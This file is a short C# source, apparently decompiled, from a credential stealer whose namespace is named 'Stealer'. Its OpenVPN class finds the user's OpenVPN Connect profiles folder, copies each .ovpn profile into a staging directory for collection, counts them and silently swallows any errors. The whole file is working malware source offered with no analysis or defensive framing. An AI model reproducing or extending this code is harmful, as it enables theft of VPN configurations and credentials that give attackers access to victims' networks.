using System;
using System.IO;

namespace Stealer
{
	// Token: 0x02000022 RID: 34
	internal sealed class OpenVPN
	{
		// Token: 0x060000AA RID: 170 RVA: 0x0000645C File Offset: 0x0000465C
		public static void Save(string sSavePath)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
			if (!Directory.Exists(path))
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(sSavePath + "\\profiles");
				foreach (string text in Directory.GetFiles(path))
				{
					if (Path.GetExtension(text).Contains("ovpn"))
					{
						Counter.VPN++;
						File.Copy(text, Path.Combine(sSavePath, "profiles\\" + Path.GetFileName(text)));
					}
				}
			}
			catch
			{
			}
		}
	}
}
